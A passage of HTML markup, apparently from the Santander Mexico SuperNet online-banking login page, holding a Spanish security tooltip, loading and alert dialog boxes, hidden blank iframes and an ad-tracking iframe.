                <font id="i15" class="oculta" style="position:absolute;left:147px;top:383px;font-size:11;color:white;"><b>Imagen seleccionada</b></font>
            </div>
            <div id="aToolTip_STU" class="oculta" style="position: absolute; left: 424px; top: 3px; width: 402px; height: 225px; background-color: rgb(255, 255, 255); display: none;"><a id="toolTipCloseBtn" class="aToolTipCloseBtn" style="position:absolute;left:379px;top:1px;" href="#">X</a>
                <fieldset id="c_i9_cp_cp" style="position:absolute;left:11px;top:23px;width:378;display:inline;border-width:0;">
                    <font id="i9_cp_cp" class="txt_aToolTip_STU" style="font-size:11;">En Santander nos preocupa su seguridad por lo que le pedimos que siga los siguientes pasos para ingresar a <b>Super<font color="red" style="font-size:11;font-family:Verdana, Geneva, sans-serif;">Net</font></b>.</font>
                </fieldset>
                <fieldset id="c_i9_cp1_cp_cp1" style="position:absolute;left:11px;top:60px;width:378;display:inline;border-width:0;">
                    <font id="i9_cp1_cp_cp1" class="txt_aToolTip_STU" style="font-size:11;">
                        <ol>
                            <li>Verifique que la imagen y frase (saludo inicial) sean las que usted definió al personalizar su acceso a <b>Super<font color="red" style="font-size:11;font-family:Verdana, Geneva, sans-serif;">Net</font></b>.</li><br>
                            <li>Si la imagen y frase son correctas coloque su NIP de acceso.</li><br>
                            <li>Dé clic sobre el botón <b>Ingresar</b>.</li>
                        </ol>
                    </font>
                </fieldset>
                <fieldset id="c_i9_cp1" style="position:absolute;left:11px;top:169px;width:378;display:inline;border-width:0;">
                    <font id="i9_cp1" class="txt_aToolTip_STU" style="font-size:11;">Si usted no reconoce la imagen y/o frase <b>dé clic sobre el botón Cerrar </b>y repórtelo comunicándose a <b>Super<font color="red" style="font-size:11;font-family:Verdana, Geneva, sans-serif;">Línea</font></b> al 5169 4300 en la Cd. de México ó 0155 51694300 del interior de la República.</font>
                </fieldset>
            </div>
        </div>
    </div>
</div>
    
    <div id="loading2" class="mainWin" style="display: none; position: absolute; left: 100px; top: 100px;  z-index: 30000; width: 206px; height: 112px;">
    <div id="UtilDialogHeader2" class="title" style="position: absolute; left: 1px; top: 1px; width: 202px; height: 28px;">
        <table id="UtilDialogHeader_Table" style="position:relative;left:0px;top:0px;" width="100%" cellspacing="0" cellpadding="0">
            <tbody>
            <tr id="i5" height="28">
                <td class="dheader" id="td0UtilDialogHeader" style="width: 100%;">
                    <font id="UtilDialogHeaderTitle" class="header" style="position:absolute;left:9px;top:4px;">Cargando Datos...</font><a id="UtilDialogHeaderFOCUS" style="position:relative;left:0px;top:0px;" href="#"></a>
                </td>
                <td class="dheader" id="td1UtilDialogHeader" style="width: 30px;" align="right">
                    <img id="UtilHelp" style="position: relative; left: 0px; top: 0px; display: none;" src="img/ayuda1.gif" imgname="ayuda1" border="0">
                </td>
            </tr>
            </tbody>
        </table>
    </div>
    <div id="UtilDialogBody2" class="win_bckg" style="position: absolute; left: 1px; top: 29px; width: 202px; height: 80px;">
        <div id="loadingCont" style="position:absolute;left:0px;top:0px;width:200;height:80;background-color:#FFFFFF;"></div><img id="i12" style="position:absolute;left:68px;top:7px;cursor: hand;" src="img/loading4.gif" imgname="loading4" width="60" height="60" border="0"><a id="imageLoading" style="position:absolute;left:68px;top:7px;" href="#"></a>
    </div>
</div>
    
    
<div id="loading.UtilDialog" class="mainWin" style="position: absolute; left: 100px; top: 100px; display: none; z-index: 30000; width: 206px; height: 112px;">
    <div id="loading.UtilDialogHeader" class="title" style="position: absolute; left: 1px; top: 1px; width: 202px; height: 28px;">
        <table id="loading.UtilDialogHeader_Table" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="0" cellspacing="0">
            <tbody>
            <tr id="loading.i5" height="28">
                <td class="dheader" id="loading.td0UtilDialogHeader">

                    <font id="loading.UtilDialogHeaderTitle" class="header" style="position:absolute;left:9px;top:4px;">Cargando Datos...</font><a id="loading.UtilDialogHeaderFOCUS" style="position:relative;left:0px;top:0px;" href="#"></a>
                </td>
                <td class="dheader" id="loading.td1UtilDialogHeader" align="right">
                    <img id="loading.UtilHelp" style="position: relative; left: 0px; top: 0px; cursor: pointer; display: none;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                </td>
            </tr>
            </tbody>
        </table>
    </div>
    <div id="loading.UtilDialogBody" class="win_bckg" style="position: absolute; left: 1px; top: 29px; width: 202px; height: 80px;">
        <div id="loadingCont" style="position:absolute;left:0px;top:0px;width:200;height:80;background-color:#FFFFFF;"></div><img id="i12" style="position:absolute;left:68px;top:7px;cursor: hand;" src="img/loading4.gif" border="0" height="60" width="60" imgname="loading4"><a id="imageLoading" style="position:absolute;left:68px;top:7px;" href="#"></a>
    </div>
</div>
<div id="alrtII.UtilDialog" class="mainWin" style="position: absolute; left: 150px; top: 110px; display: none; z-index: 20000; width: 404px; height: 47px;">
    <div id="alrtII.UtilDialogHeader" class="title" style="position: absolute; left: 1px; top: 1px; width: 400px; height: 28px;">
        <table id="alrtII.UtilDialogHeader_Table" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="0" cellspacing="0">
            <tbody>
            <tr id="alrtII.i5" height="28">
                <td class="dheader" id="alrtII.td0UtilDialogHeader">

                    <font id="alrtII.UtilDialogHeaderTitle" class="header" style="position:absolute;left:9px;top:4px;">DialogTitle</font><a id="alrtII.UtilDialogHeaderFOCUS" style="position:relative;left:0px;top:0px;" href="#"></a>
                </td>
                <td class="dheader" id="alrtII.td1UtilDialogHeader" align="right">
                    <img id="alrtII.UtilHelp" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                </td>
            </tr>
            </tbody>
        </table>
    </div>
    <div id="alrtII.UtilDialogBody" class="win_bckg" style="position: absolute; left: 1px; top: 29px; width: 400px; height: 15px;">
        <div id="alertIICont" style="position:relative;left:0px;top:0px;width:100%;">
            <table id="alertII.tbCont" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="10">
                <tbody>
                <tr id="i27">
                    <td id="i28"></td>
                </tr>
                <tr id="i31">
                    <td id="alertIIBodyCont"></td>
                </tr>
                <tr id="i33">
                    <td id="i34"></td>
                </tr>
                </tbody>
            </table>
            <div id="UtilConfirmII.divButtons" class="dialogButton" style="position:relative;left:0px;top:0px;width:100%;">
                <table id="UtilConfirm.tbButtons" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="5">
                    <tbody>
                    <tr id="i5">
                        <td id="i6" align="right"><button id="UtilAlertII.Continuar" name="enter" class="accionBtn" value="aceptar" style="position:relative;left:0px;top:0px;width:63;height:22;" type="button"><u></u>aceptar</button>

                        </td>
                        <td id="i8">

                        </td>
                        <td id="i10"><button id="UtilAlertII.Cancelar" name="cancel" class="accionBtn" value="cancelar" style="position:relative;left:0px;top:0px;width:63;height:22;" type="button"><u></u>cancelar</button>

                        </td>
                    </tr>
                    </tbody>
                </table>
            </div>
            <div id="UtilAlertII.divAlert" style="position: relative; left: 0px; top: 0px; width: 100%; display: none;">
                <table id="UtilAlert.tbAlert" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="5">
                    <tbody>
                    <tr id="i17">
                        <td id="i18" align="center"><button id="UtilAlertII.cerrar" name="cancel" class="accionBtn" value="Cerrar" style="position:relative;left:0px;top:0px;width:63;height:22;" type="button"><u></u>Cerrar</button>

                        </td>
                    </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div><iframe id="iframe849" frameborder="0" src="about:blank" title="rplidd" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe978" frameborder="0" src="about:blank" title="dtnrme" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe752" frameborder="0" src="about:blank" title="fd_pqp" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe frameborder="0" title="qmcgip" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"></iframe><iframe frameborder="0" title="xipslu" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe700" frameborder="0" src="about:blank" title="cdvhgk" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe47" frameborder="0" src="about:blank" title="oh_xxc" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe409" frameborder="0" src="about:blank" title="hckpnz" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe621" frameborder="0" src="about:blank" title="feerdb" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe height="1" width="1" style="display:none" src="//8175096.fls.doubleclick.net/activityi;src=8175096;type=homes00;cat=homes0;ord=4310359798760.1104?" id="utag_19_iframe"></iframe><iframe id="iframe725" frameborder="0" src="about:blank" title="wwzedl" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe262" frameborder="0" src="about:blank" title="cnpmqg" style="width: 0px; height: 0px; border: none; display: none;"></iframe>
</body>

</html>
